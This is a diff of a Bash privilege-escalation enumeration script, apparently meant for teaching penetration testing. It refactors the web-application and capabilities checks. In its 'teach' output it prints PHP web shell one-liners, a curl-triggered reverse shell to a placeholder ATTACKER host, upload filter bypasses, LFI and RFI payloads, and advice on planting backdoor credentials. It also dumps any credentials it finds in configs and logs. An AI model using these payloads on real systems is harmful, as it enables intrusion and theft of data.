-                teach "  curl http://localhost/shell.php?cmd=whoami"
-                teach ""
-                teach "Or hidden shell:"
-                teach "  echo '<?php eval(\$_POST[\"x\"]); ?>' > $webroot/.config.php"
+                echo "$webroot" >> "$temp_writable_roots"
+                found_writable_webroot=1
             fi
             
-            # === CHECK 2: Upload Directories ===
-            info "Checking for upload directories..."
+            # === CHECK 2: Writable Upload Directories ===
             for upload_dir in "uploads" "upload" "files" "media" "assets" "images" "attachments" "documents"; do
                 local upload_path="$webroot/$upload_dir"
-                if [ -d "$upload_path" ]; then
-                    info "  Found upload directory: $upload_path"
-                    
-                    if [ -w "$upload_path" ]; then
-                        critical "Upload directory WRITABLE: $upload_path"
-                        vuln "Writable upload directory: $upload_path"
-                        
-                        # Check if PHP execution is enabled in this directory
-                        if [ -f "$upload_path/../.htaccess" ]; then
-                            if grep -iE "php_flag|php_admin|AddHandler|SetHandler" "$upload_path/../.htaccess" 2>/dev/null | grep -q "."; then
-                                info "  .htaccess found - check if PHP execution is restricted"
-                            fi
+                if [ -d "$upload_path" ] && [ -w "$upload_path" ]; then
+                    # Check if .htaccess restricts PHP execution
+                    local htaccess_blocks_php=0
+                    if [ -f "$upload_path/.htaccess" ]; then
+                        if grep -qiE "php_flag|php_admin_flag.*off|RemoveHandler.*php|RemoveType.*php" "$upload_path/.htaccess" 2>/dev/null; then
+                            htaccess_blocks_php=1
                         fi
-                        
-                        teach "  Upload techniques:"
-                        teach "    1. Direct: echo '<?php system(\$_GET[\"c\"]); ?>' > $upload_path/shell.php"
-                        teach "    2. If .php blocked, try: .php3, .php4, .php5, .phtml, .phar"
-                        teach "    3. Double extension: shell.php.jpg (may bypass filters)"
-                        teach "    4. Null byte: shell.php%00.jpg (older PHP versions)"
-                        teach "    5. .htaccess upload to enable PHP: echo 'AddType application/x-httpd-php .jpg' > $upload_path/.htaccess"
                     fi
                     
-                    # Check for existing suspicious files
-                    find "$upload_path" -maxdepth 2 -type f \( -name "*.php" -o -name "*.jsp" -o -name "*.aspx" -o -name "shell.*" -o -name "c99.*" -o -name "r57.*" \) 2>/dev/null | while read suspicious; do
-                        warn "  Suspicious file in uploads: $suspicious"
-                        if grep -iq "system\|exec\|shell_exec\|passthru\|eval" "$suspicious" 2>/dev/null; then
-                            critical "  Existing web shell detected: $suspicious"
-                            vuln "Existing web shell found: $suspicious"
-                        fi
-                    done
+                    echo "$upload_path|$htaccess_blocks_php" >> "$temp_writable_uploads"
+                    found_writable_uploads=1
                 fi
             done
             
-            # === CHECK 3: Configuration Files ===
-            info "Searching for configuration files..."
-            find "$webroot" -maxdepth 3 -type f \( -name "*.conf" -o -name "*.config" -o -name "*config*.php" -o -name ".env" -o -name "*.yml" -o -name "*.yaml" -o -name "*.ini" \) 2>/dev/null | \
+            # === CHECK 3: Configuration Files with Credentials ===
+            find "$webroot" -maxdepth 3 -type f \( -name "*.conf" -o -name "*.config" -o -name "*config*.php" \
+                -o -name ".env" -o -name "*.yml" -o -name "*.yaml" -o -name "*.ini" \) 2>/dev/null | \
             grep -vE "sample|example|setup-config|default-|node_modules|vendor" | head -15 | while read config; do
                 if [ -r "$config" ]; then
-                    info "  Found config: $config"
-                    
-                    # Check for credentials with better patterns
-                    if grep -iE "(password|passwd|pwd|secret|token|api[_-]?key)[[:space:]]*[=:'\"]" "$config" 2>/dev/null | \
-                       grep -vE "^[[:space:]]*[#;]|example|sample|your_|changeme|<password>|password_here" | head -3 | grep -q "."; then
-                        critical "Config contains credentials: $config"
-                        vuln "Configuration file with credentials: $config"
-                        grep -iE "(password|passwd|secret|token|api[_-]?key)[[:space:]]*[=:'\"]" "$config" 2>/dev/null | \
-                        grep -vE "^[[:space:]]*[#;]|example" | head -3 | while read line; do
-                            log "    $line"
-                        done
-                    fi
-                    
-                    # Check if writable
-                    if [ -w "$config" ]; then
-                        vuln "Config file is WRITABLE: $config"
-                        teach "  Modify to add backdoor credentials or change settings"
+                    # More precise credential detection - avoid false positives
+                    if grep -E "(password|passwd|secret|token|api[_-]?key)[\"']?\s*[:=]\s*[\"']?[^\"\s]{3,}" "$config" 2>/dev/null | \
+                       grep -vE "^\s*[#;/]|example|sample|your_|changeme|<password>|password_here|PUT_|INSERT_|ENTER_" | head -3 | grep -q "."; then
+                        local is_writable=$( [ -w "$config" ] && echo "1" || echo "0" )
+                        echo "$config|$is_writable" >> "$temp_configs"
+                        found_credentials=1
                     fi
                 fi
             done
             
-            # === CHECK 4: WordPress Specific ===
+            # === CHECK 4: WordPress Detection ===
             if [ -f "$webroot/wp-config.php" ]; then
-                vuln "WordPress installation: $webroot"
-                teach "WordPress enumeration tips:"
-                teach "  • Check wp-config.php for DB credentials"
-                teach "  • Look for wp-config.php.bak, wp-config.php~, wp-config.old"
-                teach "  • Enumerate users: curl http://site/wp-json/wp/v2/users"
-                teach "  • Check plugins for vulnerabilities: ls wp-content/plugins/"
-                teach "  • xmlrpc.php for brute force amplification"
+                local wp_readable=$( [ -r "$webroot/wp-config.php" ] && echo "1" || echo "0" )
+                local wp_writable=$( [ -w "$webroot/wp-config.php" ] && echo "1" || echo "0" )
+                local has_backups=0
+                local has_xmlrpc=$( [ -f "$webroot/xmlrpc.php" ] && echo "1" || echo "0" )
+                local has_json_api=$( [ -d "$webroot/wp-json" ] && echo "1" || echo "0" )
+                local plugin_count=$(ls -1 "$webroot/wp-content/plugins" 2>/dev/null | wc -l)
                 
-                # Check for WordPress backups
-                find "$webroot" -maxdepth 1 -type f \( -name "wp-config*.bak" -o -name "wp-config*.old" -o -name "wp-config*~" -o -name "wp-config*.save" \) 2>/dev/null | while read backup; do
-                    if [ -r "$backup" ]; then
-                        critical "WordPress config backup readable: $backup"
-                        vuln "WordPress backup file: $backup"
-                    fi
-                done
+                # Check for wp-config backups
+                if find "$webroot" -maxdepth 1 -type f \( -name "wp-config.php.bak" -o -name "wp-config.php.old" \
+                    -o -name "wp-config.php~" -o -name "wp-config.php.save" \) -readable 2>/dev/null | grep -q .; then
+                    has_backups=1
+                fi
+                
+                echo "$webroot|$wp_readable|$wp_writable|$has_backups|$has_xmlrpc|$has_json_api|$plugin_count" >> "$temp_wordpress"
+                found_wordpress=1
             fi
             
             # === CHECK 5: Framework Detection ===
-            info "Detecting web frameworks..."
-            
             # Laravel
             if [ -f "$webroot/.env" ] || [ -d "$webroot/storage" ]; then
-                info "  Laravel framework detected"
-                if [ -r "$webroot/.env" ]; then
-                    critical "Laravel .env file readable: $webroot/.env"
-                    vuln "Laravel .env exposed"
-                fi
+                local env_readable=$( [ -r "$webroot/.env" ] && echo "1" || echo "0" )
+                echo "Laravel|$webroot|$env_readable" >> "$temp_frameworks"
+                found_frameworks=1
             fi
             
             # Django
-            if [ -f "$webroot/manage.py" ] || find "$webroot" -name "settings.py" 2>/dev/null | grep -q "."; then
-                info "  Django framework detected"
-                find "$webroot" -name "settings.py" -readable 2>/dev/null | head -3 | while read settings; do
-                    info "  Django settings: $settings"
-                    if grep -E "SECRET_KEY|DATABASE|PASSWORD" "$settings" 2>/dev/null | grep -q "."; then
-                        vuln "Django settings contain credentials: $settings"
-                    fi
-                done
+            if [ -f "$webroot/manage.py" ] || find "$webroot" -maxdepth 2 -name "settings.py" 2>/dev/null | grep -q .; then
+                local settings_file=$(find "$webroot" -maxdepth 3 -name "settings.py" -readable 2>/dev/null | head -1)
+                local has_secrets=$( [ -n "$settings_file" ] && grep -qE "SECRET_KEY|DATABASE|PASSWORD" "$settings_file" 2>/dev/null && echo "1" || echo "0" )
+                echo "Django|$webroot|$settings_file|$has_secrets" >> "$temp_frameworks"
+                found_frameworks=1
             fi
             
             # Node.js/Express
             if [ -f "$webroot/package.json" ]; then
-                info "  Node.js application detected"
-                if [ -r "$webroot/.env" ]; then
-                    critical "Node.js .env file readable"
-                fi
+                local has_env=$( [ -r "$webroot/.env" ] && echo "1" || echo "0" )
+                echo "Node.js|$webroot|$has_env" >> "$temp_frameworks"
+                found_frameworks=1
             fi
             
-            # Ruby on Rails
+            # Rails
             if [ -d "$webroot/config" ] && [ -f "$webroot/config.ru" ]; then
-                info "  Ruby on Rails detected"
-                if [ -r "$webroot/config/database.yml" ]; then
-                    critical "Rails database.yml readable: $webroot/config/database.yml"
-                    vuln "Rails database config exposed"
-                fi
+                local db_readable=$( [ -r "$webroot/config/database.yml" ] && echo "1" || echo "0" )
+                echo "Rails|$webroot|$db_readable" >> "$temp_frameworks"
+                found_frameworks=1
             fi
             
-            # === CHECK 6: .htaccess Files ===
-            info "Checking for .htaccess files..."
-            find "$webroot" -maxdepth 3 -name ".htaccess" -type f 2>/dev/null | while read htaccess; do
-                if [ -r "$htaccess" ]; then
-                    info "  Found .htaccess: $htaccess"
-                    
-                    if [ -w "$htaccess" ]; then
-                        critical ".htaccess is WRITABLE: $htaccess"
-                        vuln "Writable .htaccess: $htaccess"
-                        teach "  Enable PHP in images: echo 'AddType application/x-httpd-php .jpg' >> $htaccess"
-                        teach "  Bypass auth: echo 'Require all granted' >> $htaccess"
-                    fi
-                    
-                    # Check for auth directives
-                    if grep -qE "AuthUserFile|Require valid-user" "$htaccess" 2>/dev/null; then
-                        info "  Protected by HTTP auth"
+            # === CHECK 6: Web Server Logs with Credentials (only once, not per webroot) ===
+            # Skip this check if we already processed logs
+            if [ "$webroot" = "/var/www/html" ] || [ "$webroot" = "/var/www" ]; then
+                for logfile in "/var/log/apache2/access.log" "/var/log/nginx/access.log" "$webroot/../logs/access.log"; do
+                    if [ -r "$logfile" ]; then
+                        # Check if already processed
+                        if [ -f "$temp_log_creds" ] && grep -q "^$logfile$" "$temp_log_creds" 2>/dev/null; then
+                            continue
+                        fi
                         
-                        # Try to find .htpasswd
-                        local htpasswd=$(grep "AuthUserFile" "$htaccess" 2>/dev/null | awk '{print $2}')
-                        if [ -n "$htpasswd" ] && [ -r "$htpasswd" ]; then
-                            critical "Password file readable: $htpasswd"
-                            vuln "HTTP auth password file exposed: $htpasswd"
-                            teach "  Crack with: john $htpasswd"
+                        # Look for credentials in GET parameters
+                        if grep -E "(password|passwd|pwd|token|api_key)=[^& ]{3,}" "$logfile" 2>/dev/null | grep -v "password=\*\*\*\*" | tail -3 | grep -q "."; then
+                            echo "$logfile" >> "$temp_log_creds"
+                            found_logs_with_creds=1
                         fi
                     fi
-                fi
-            done
+                done
+            fi
             
-            # === CHECK 7: Log Files ===
-            info "Checking web server logs for credentials in URLs..."
-            for logfile in "$webroot/../logs/access.log" "/var/log/apache2/access.log" "/var/log/nginx/access.log"; do
-                if [ -r "$logfile" ]; then
-                    # Look for credentials passed in GET parameters
-                    if grep -iE "password=|passwd=|pwd=|token=|api_key=" "$logfile" 2>/dev/null | tail -5 | grep -q "."; then
-                        warn "Access log contains credentials in URLs: $logfile"
-                        grep -iE "password=|passwd=|pwd=|token=" "$logfile" 2>/dev/null | tail -3 | while read line; do
-                            log "  $line"
-                        done
-                        teach "  Credentials submitted via GET are logged!"
+            # === CHECK 7: Web Shell Detection (Improved) ===
+            # Whitelist of known safe files that contain suspicious patterns
+            local safe_patterns="class-phpmailer\.php|class-smtp\.php|class-ftp\.php|class-ftp-sockets\.php|"
+            safe_patterns+="file\.php.*wp-admin|Filesystem\.php|Process\.php|vendor/|node_modules/|"
+            safe_patterns+="wp-includes/.*\.php|laravel/framework"
+            
+            find "$webroot" -maxdepth 3 -type f \( -name "*.php" -o -name "*.phtml" \) 2>/dev/null | \
+            grep -vE "$safe_patterns" | while read phpfile; do
+                local filesize=$(stat -c%s "$phpfile" 2>/dev/null || echo "0")
+                
+                # Skip very large files (likely legitimate)
+                [ $filesize -gt 1000000 ] && continue
+                
+                # Check for web shell signatures with context
+                local suspicious_count=0
+                local has_eval=$(grep -c "eval(" "$phpfile" 2>/dev/null | head -1)
+                local has_base64=$(grep -c "base64_decode" "$phpfile" 2>/dev/null | head -1)
+                local has_system=$(grep -c "system(" "$phpfile" 2>/dev/null | head -1)
+                local has_exec=$(grep -c "exec(" "$phpfile" 2>/dev/null | head -1)
+                local has_shell_exec=$(grep -c "shell_exec(" "$phpfile" 2>/dev/null | head -1)
+                local has_passthru=$(grep -c "passthru(" "$phpfile" 2>/dev/null | head -1)
+                
+                # Ensure all values are numeric (handle empty strings)
+                has_eval=${has_eval:-0}
+                has_base64=${has_base64:-0}
+                has_system=${has_system:-0}
+                has_exec=${has_exec:-0}
+                has_shell_exec=${has_shell_exec:-0}
+                has_passthru=${has_passthru:-0}
+                
+                # Score the file
+                suspicious_count=$((has_eval + has_base64 + has_system + has_exec + has_shell_exec + has_passthru))
+                
+                # High confidence: Multiple dangerous functions or eval+base64 combo
+                if [ $suspicious_count -ge 4 ] || { [ $has_eval -gt 0 ] && [ $has_base64 -gt 1 ]; }; then
+                    # Additional check: Look for common web shell indicators (escape $ properly)
+                    if grep -qE "c99|r57|b374k|wso|shell|backdoor|\\$_(GET|POST|REQUEST)" "$phpfile" 2>/dev/null; then
+                        echo "$phpfile|high|$suspicious_count" >> "$temp_shells"
+                        found_web_shells=1
                     fi
-                fi
-            done
-            
-            # === CHECK 8: Session Files ===
-            for session_dir in "$webroot/../sessions" "/var/lib/php/sessions" "/tmp"; do
-                if [ -d "$session_dir" ]; then
-                    local session_count=$(find "$session_dir" -name "sess_*" -type f 2>/dev/null | wc -l)
-                    if [ $session_count -gt 0 ]; then
-                        info "Found $session_count PHP session files in: $session_dir"
-                        
-                        if [ -r "$session_dir" ]; then
-                            # Check if any sessions contain interesting data
-                            find "$session_dir" -name "sess_*" -type f -readable 2>/dev/null | head -3 | while read session; do
-                                if grep -iE "admin|user|password|token" "$session" 2>/dev/null | grep -q "."; then
-                                    warn "  Session with potential credentials: $session"
-                                fi
-                            done
-                        fi
-                    fi
-                fi
-            done
-            
-            # === CHECK 9: Existing Web Shells ===
-            info "Scanning for existing web shells..."
-            local shell_patterns="c99|r57|b374k|wso|shell|cmd|eval\(|base64_decode|system\(|exec\(|passthru\("
-            
-            find "$webroot" -maxdepth 3 -type f \( -name "*.php" -o -name "*.phtml" \) 2>/dev/null | while read phpfile; do
-                # Check file for shell signatures
-                if grep -iE "$shell_patterns" "$phpfile" 2>/dev/null | head -1 | grep -q "."; then
-                    # Avoid false positives from legitimate code
-                    local suspicious_count=$(grep -icE "system\(|exec\(|shell_exec\(|passthru\(|eval\(" "$phpfile" 2>/dev/null)
-                    if [ $suspicious_count -gt 2 ]; then
-                        critical "Potential web shell: $phpfile (confidence: high)"
-                        vuln "Possible existing web shell: $phpfile"
-                        teach "  Analyze: cat $phpfile | head -20"
+                # Medium confidence: 3 dangerous functions
+                elif [ $suspicious_count -eq 3 ]; then
+                    if grep -qE "\\$_(GET|POST|REQUEST).*(system|exec|eval)" "$phpfile" 2>/dev/null; then
+                        echo "$phpfile|medium|$suspicious_count" >> "$temp_shells"
+                        found_web_shells=1
                     fi
                 fi
             done
         fi
     done
     
-    # === CHECK 10: Running Web Server Detection ===
+    # === PHASE 2: CONDITIONAL EDUCATION (only if issues found) ===
+    local any_issues=$((found_writable_webroot + found_writable_uploads + found_credentials + \
+                        found_web_shells + found_wordpress + found_frameworks + found_logs_with_creds))
+    
+    if [ $any_issues -gt 0 ]; then
+        explain_concept "Web Application Attacks" \
+            "Web applications often store credentials, have writable directories, or run with elevated privileges." \
+            "Common issues: hardcoded credentials in config files, writable web roots allowing shell upload, database credentials, API tokens, LFI/RFI vulnerabilities, existing backdoors from previous compromises." \
+            "Where to look:\n  • /var/www/html - Default web root\n  • /var/www - Alternative location\n  • /opt/* - Custom applications\n  • Look for: config.php, .env, wp-config.php, database.yml\n  • Upload directories\n  • Existing web shells"
+    fi
+    
+    # === PHASE 3: REPORT SPECIFIC FINDINGS ===
+    
+    # Report writable web roots
+    if [ -f "$temp_writable_roots" ]; then
+        while IFS= read -r webroot; do
+            critical "Web root WRITABLE - Upload shell for remote code execution"
+            vuln "Web root is WRITABLE: $webroot"
+            log ""
+            teach "╔═══════════════════════════════════════╗"
+            teach "║  Writable Web Root Exploitation"
+            teach "╚═══════════════════════════════════════"
+            teach ""
+            teach "WHAT YOU CAN DO:"
+            teach "  Upload a web shell to execute commands through the browser"
+            teach ""
+            teach "EXPLOITATION:"
+            teach "  1. Create simple PHP shell:"
+            teach "     echo '<?php system(\$_GET[\"cmd\"]); ?>' > $webroot/shell.php"
+            teach ""
+            teach "  2. Make it hidden:"
+            teach "     echo '<?php system(\$_GET[\"c\"]); ?>' > $webroot/.shell.php"
+            teach ""
+            teach "  3. Access via web:"
+            teach "     curl http://localhost/shell.php?cmd=whoami"
+            teach ""
+            teach "  4. Upgrade to reverse shell:"
+            teach "     curl 'http://localhost/shell.php?cmd=bash+-c+\"bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261\"'"
+            log ""
+        done < "$temp_writable_roots"
+    fi
+    
+    # Report writable upload directories
+    if [ -f "$temp_writable_uploads" ]; then
+        while IFS='|' read -r upload_path htaccess_blocks; do
+            if [ "$htaccess_blocks" = "1" ]; then
+                warn "Upload directory writable but .htaccess may block PHP: $upload_path"
+                teach "  .htaccess restricts PHP execution - check if it can be bypassed"
+            else
+                critical "Upload directory WRITABLE with PHP execution: $upload_path"
+                vuln "Writable upload directory: $upload_path"
+                log ""
+                teach "╔═══════════════════════════════════════╗"
+                teach "║  Upload Directory Exploitation"
+                teach "╚═══════════════════════════════════════"
+                teach ""
+                teach "BYPASS TECHNIQUES:"
+                teach "  1. Direct upload if no .htaccess:"
+                teach "     echo '<?php system(\$_GET[\"c\"]); ?>' > $upload_path/shell.php"
+                teach ""
+                teach "  2. If .php blocked, try alternate extensions:"
+                teach "     • .php3, .php4, .php5, .phtml, .phar"
+                teach "     • shell.php.jpg (double extension bypass)"
+                teach "     • shell.php%00.jpg (null byte - old PHP)"
+                teach ""
+                teach "  3. Upload .htaccess to enable PHP:"
+                teach "     echo 'AddType application/x-httpd-php .jpg' > $upload_path/.htaccess"
+                teach "     Then upload shell as .jpg"
+                log ""
+            fi
+        done < "$temp_writable_uploads"
+    fi
+    
+    # Report configs with credentials
+    if [ -f "$temp_configs" ]; then
+        while IFS='|' read -r config is_writable; do
+            critical "Config contains credentials: $config"
+            vuln "Configuration file with credentials: $config"
+            
+            # Show actual credentials (first 3 matches)
+            grep -E "(password|passwd|secret|token|api[_-]?key)[\"']?\s*[:=]\s*[\"']?[^\"\s]{3,}" "$config" 2>/dev/null | \
+            grep -vE "^\s*[#;/]|example" | head -3 | while read line; do
+                log "    $line"
+            done
+            
+            if [ "$is_writable" = "1" ]; then
+                vuln "Config file is WRITABLE: $config"
+                teach "  Modify to add backdoor credentials or change settings"
+            fi
+            log ""
+        done < "$temp_configs"
+    fi
+    
+    # Report WordPress installations
+    if [ -f "$temp_wordpress" ]; then
+        while IFS='|' read -r webroot wp_readable wp_writable has_backups has_xmlrpc has_json_api plugin_count; do
+            vuln "WordPress installation: $webroot"
+            
+            if [ "$wp_readable" = "1" ]; then
+                critical "wp-config.php is READABLE - contains database credentials"
+                vuln "WordPress config readable: $webroot/wp-config.php"
+                
+                # Extract and show DB credentials
+                if grep -E "DB_PASSWORD|DB_USER|DB_NAME" "$webroot/wp-config.php" 2>/dev/null | grep -q "."; then
+                    critical "Database credentials in wp-config.php"
+                    grep -E "DB_PASSWORD|DB_USER|DB_NAME|DB_HOST" "$webroot/wp-config.php" 2>/dev/null | grep -v "put your"
+                fi
+            fi
+            
+            if [ "$has_backups" = "1" ]; then
+                critical "wp-config backup found - may contain credentials"
+                find "$webroot" -maxdepth 1 -name "wp-config.php*" ! -name "wp-config.php" -readable 2>/dev/null
+            fi
+            
+            if [ "$has_xmlrpc" = "1" ]; then
+                warn "xmlrpc.php present - enables brute force amplification"
+                teach "  Test: curl -d '<methodCall><methodName>system.listMethods</methodName></methodCall>' http://target/xmlrpc.php"
+            fi
+            
+            if [ "$has_json_api" = "1" ]; then
+                info "WordPress REST API present"
+                teach "  Enumerate users: curl http://target/wp-json/wp/v2/users"
+            fi
+            
+            if [ $plugin_count -gt 0 ]; then
+                warn "Found $plugin_count installed plugins"
+                ls -1 "$webroot/wp-content/plugins" 2>/dev/null | head -5 | while read plugin; do
+                    log "  Plugin: $plugin"
+                    if [ -f "$webroot/wp-content/plugins/$plugin/readme.txt" ]; then
+                        local version=$(grep -i "stable tag" "$webroot/wp-content/plugins/$plugin/readme.txt" 2>/dev/null | head -1)
+                        [ -n "$version" ] && info "  Version: $version" && teach "  Check exploit-db for: $plugin $version"
+                    fi
+                done
+            fi
+            log ""
+        done < "$temp_wordpress"
+    fi
+    
+    # Report frameworks
+    if [ -f "$temp_frameworks" ]; then
+        while IFS='|' read -r framework webroot extra1 extra2; do
+            case "$framework" in
+                Laravel)
+                    if [ "$extra1" = "1" ]; then
+                        critical "Laravel .env file readable: $webroot/.env"
+                        vuln "Laravel .env exposed"
+                    fi
+                    ;;
+                Django)
+                    if [ "$extra2" = "1" ]; then
+                        critical "Django settings contain credentials: $extra1"
+                        vuln "Django settings exposed: $extra1"
+                    fi
+                    ;;
+                Node.js)
+                    if [ "$extra1" = "1" ]; then
+                        critical "Node.js .env file readable"
+                    fi
+                    ;;
+                Rails)
+                    if [ "$extra1" = "1" ]; then
+                        critical "Rails database.yml readable: $webroot/config/database.yml"
+                        vuln "Rails database config exposed"
+                    fi
+                    ;;
+            esac
+        done < "$temp_frameworks"
+    fi
+    
+    # Report logs with credentials
+    if [ -f "$temp_log_creds" ]; then
+        # Deduplicate log files
+        sort -u "$temp_log_creds" | while IFS= read -r logfile; do
+            warn "Access log contains credentials in URLs: $logfile"
+            # Filter out CSRF tokens and other non-sensitive patterns
+            grep -E "(password|passwd|pwd|api_key)=[^& ]{3,}" "$logfile" 2>/dev/null | \
+            grep -vE "password=\*\*\*\*|token=[a-f0-9]{32,}" | tail -3 | while read line; do
+                log "  $line"
+            done
+            teach "  Credentials submitted via GET are logged!"
+            log ""
+        done
+    fi
+    
+    # Report web shells
+    if [ -f "$temp_shells" ]; then
+        while IFS='|' read -r phpfile confidence score; do
+            critical "Potential web shell: $phpfile (confidence: $confidence)"
+            vuln "Possible existing web shell: $phpfile"
+            teach "  Suspicious function count: $score"
+            teach "  Analyze: cat $phpfile | head -20"
+            log ""
+        done < "$temp_shells"
+    fi
+    
+    # === PHASE 4: RUNNING WEB SERVER CHECK ===
     if netstat -tuln 2>/dev/null | grep -qE ":80 |:443 |:8080 "; then
         info "Web server is listening on common ports"
         
         # Identify web server type
         if ps aux | grep -iE "apache2|httpd" | grep -v grep | grep -q "."; then
             info "Apache web server detected"
-            teach "Apache exploitation tips:"
-            teach "  • Check for writable .htaccess"
-            teach "  • Look for mod_cgi with writable cgi-bin"
-            teach "  • Check Apache version for CVEs"
+            
+            if [ $any_issues -gt 0 ]; then
+                teach ""
+                teach "Apache exploitation tips:"
+                teach "  • Check for writable .htaccess"
+                teach "  • Look for mod_cgi with writable cgi-bin"
+                teach "  • Check Apache version for CVEs"
+            fi
         fi
         
         if ps aux | grep -i nginx | grep -v grep | grep -q "."; then
             info "Nginx web server detected"
-            teach "Nginx exploitation tips:"
-            teach "  • Check nginx.conf for misconfigurations"
-            teach "  • Look for path traversal via alias directive"
-            teach "  • Check for writable sites-enabled configs"
+            
+            if [ $any_issues -gt 0 ]; then
+                teach ""
+                teach "Nginx exploitation tips:"
+                teach "  • Check nginx.conf for misconfigurations"
+                teach "  • Look for path traversal via alias directive"
+                teach "  • Check for writable sites-enabled configs"
+            fi
         fi
         
-        teach "\nGeneral web exploitation:"
-        teach "  • LFI: /index.php?page=../../../../etc/passwd"
-        teach "  • RFI: /index.php?page=http://attacker/shell.txt"
-        teach "  • Command injection: /script.php?file=test;whoami"
-        teach "  • SQL injection in parameters"
+        if [ $any_issues -gt 0 ]; then
+            teach ""
+            teach "General web exploitation:"
+            teach "  • LFI: /index.php?page=../../../../etc/passwd"
+            teach "  • RFI: /index.php?page=http://attacker/shell.txt"
+            teach "  • Command injection: /script.php?file=test;whoami"
+            teach "  • SQL injection in parameters"
+        fi
     fi
     
-    # === Summary ===
-    log ""
-    info "Web application enumeration complete"
-    teach "Key web attack vectors:"
-    teach "  1. Writable web root = direct shell upload"
-    teach "  2. Writable upload directories with PHP execution"
-    teach "  3. Config files with DB credentials"
-    teach "  4. Existing web shells from previous compromise"
-    teach "  5. Framework-specific vulnerabilities"
+    # === PHASE 5: CLEAN EXIT ===
+    if [ "$any_issues" -eq 0 ]; then
+        ok "No web application vulnerabilities detected"
+    else
+        log ""
+        info "Web application enumeration complete"
+        teach ""
+        teach "Key web attack vectors found:"
+        [ "$found_writable_webroot" -eq 1 ] 2>/dev/null && teach "  ✓ Writable web root = direct shell upload"
+        [ "$found_writable_uploads" -eq 1 ] 2>/dev/null && teach "  ✓ Writable upload directories"
+        [ "$found_credentials" -eq 1 ] 2>/dev/null && teach "  ✓ Config files with credentials"
+        [ "$found_web_shells" -eq 1 ] 2>/dev/null && teach "  ✓ Existing web shells detected"
+        [ "$found_wordpress" -eq 1 ] 2>/dev/null && teach "  ✓ WordPress installation found"
+        [ "$found_frameworks" -eq 1 ] 2>/dev/null && teach "  ✓ Web frameworks detected"
+    fi
 }
 # === POST-EXPLOITATION ===
 enum_post_exploit() {
@@ -2598,246 +2953,256 @@ enum_writable_files() {
 enum_capabilities() {
     section "LINUX CAPABILITIES"
     
-    explain_concept "Linux Capabilities" \
-        "Capabilities split root's power into 38 distinct units. A binary can have specific root-like powers without full root access." \
-        "Traditional Unix has only two privilege levels: root (UID 0) and everyone else. This is too coarse - a web server needs to bind to port 80 (requires root) but shouldn't be able to read all files or kill processes. Capabilities solve this by breaking root's power into specific permissions." \
-        "Why capabilities exist:\n  • Principle of least privilege\n  • Avoid SUID root for simple tasks\n  • Example: ping needs raw sockets (CAP_NET_RAW) but not full root\n  • More granular than 'all or nothing'\n\nDangerous capabilities:\n  • cap_setuid = become any user including root\n  • cap_dac_override = bypass file permission checks\n  • cap_dac_read_search = read any file\n  • cap_sys_admin = broad admin powers\n  • cap_sys_ptrace = debug any process (inject code)"
-    
-    log ""
-    teach "╔════════════════════════════════════════════════════════════╗"
-    teach "║  UNDERSTANDING CAPABILITIES - THE FUNDAMENTALS"
-    teach "╚════════════════════════════════════════════════════════════╝"
-    teach ""
-    teach "THE PROBLEM CAPABILITIES SOLVE:"
-    teach ""
-    teach "  Traditional Unix Security Model:"
-    teach "  • Root (UID 0): Can do EVERYTHING"
-    teach "  • Non-root: Can do very little"
-    teach "  • No middle ground"
-    teach ""
-    teach "  Real-world example - ping command:"
-    teach "  • Needs to send raw network packets (requires root)"
-    teach "  • Solution before capabilities: Make ping SUID root"
-    teach "  • Problem: Now ping runs with FULL root privileges"
-    teach "  • Risk: If ping has a bug, attacker gets full root"
-    teach ""
-    teach "  Solution with capabilities:"
-    teach "  • Give ping ONLY CAP_NET_RAW (raw socket access)"
-    teach "  • ping can send packets but can't read files, kill processes, etc."
-    teach "  • Much safer than full SUID root"
-    teach ""
-    teach "CAPABILITY vs SUID - KEY DIFFERENCES:"
-    teach ""
-    teach "  SUID Binary:"
-    teach "  • Runs with ALL permissions of the file owner (usually root)"
-    teach "  • If owner is root = full system control"
-    teach "  • All or nothing approach"
-    teach "  • Example: /usr/bin/passwd is SUID root"
-    teach ""
-    teach "  Capability-enabled Binary:"
-    teach "  • Has SPECIFIC permissions only"
-    teach "  • Can't do anything outside those specific capabilities"
-    teach "  • Granular control"
-    teach "  • Example: ping with CAP_NET_RAW can ONLY send raw packets"
-    teach ""
-    teach "THE 38 CAPABILITIES:"
-    teach "  There are 38 distinct capabilities (as of modern kernels)."
-    teach "  Each represents a specific privilege that root normally has."
-    teach "  Examples:"
-    teach "  • CAP_NET_BIND_SERVICE: Bind to ports < 1024"
-    teach "  • CAP_NET_RAW: Use raw sockets (ping, traceroute)"
-    teach "  • CAP_SETUID: Change user ID (become another user)"
-    teach "  • CAP_DAC_OVERRIDE: Bypass file read/write/execute checks"
-    teach "  • CAP_SYS_ADMIN: Perform system administration operations"
-    teach ""
-    log ""
-    
-    local caps_found=0
-    
     if ! command -v getcap >/dev/null 2>&1; then
         warn "getcap not available (install libcap2-bin to check capabilities)"
         return
     fi
     
+    # === PHASE 1: SILENT SCAN - Check what capabilities exist ===
     info "Scanning for binaries with capabilities..."
-    log ""
     
-    local caps_found=0
-    local has_dangerous_caps=0
-    
-    # First pass - check if any capabilities exist at all
     local cap_output=$(getcap -r / 2>/dev/null)
     
+    # Quick exit if nothing found at all
     if [ -z "$cap_output" ]; then
         ok "No capabilities found on this system"
         log ""
-        teach "No binaries have elevated capabilities set. This is common - most"
-        teach "systems use SUID instead. Capabilities are explicitly set by admins"
-        teach "with the setcap command, so their absence is normal."
+        teach "No binaries have elevated capabilities. This is normal - most systems"
+        teach "use SUID instead. Capabilities must be explicitly set with setcap."
         return
     fi
     
-    # Check if any dangerous capabilities exist
-    if echo "$cap_output" | grep -qE "cap_setuid|cap_dac_override|cap_dac_read_search|cap_sys_admin|cap_sys_ptrace|cap_sys_module"; then
-        has_dangerous_caps=1
-    fi
+    # === PHASE 2: ANALYZE FOR DANGEROUS CAPABILITIES ===
+    # Whitelist of legitimate capability usage (reduces false positives)
+    local legit_caps=(
+        # Network tools that need raw socket access
+        "/bin/ping:cap_net_raw"
+        "/usr/bin/ping:cap_net_raw"
+        "/bin/ping6:cap_net_raw"
+        "/usr/bin/ping6:cap_net_raw"
+        "/usr/bin/mtr-packet:cap_net_raw"
+        "/usr/bin/traceroute6.iputils:cap_net_raw"
+        
+        # systemd components (normal for modern systems)
+        "/usr/bin/systemd-detect-virt:cap_dac_override,cap_sys_ptrace"
+        "/usr/lib/systemd/systemd-resolved:cap_net_bind_service"
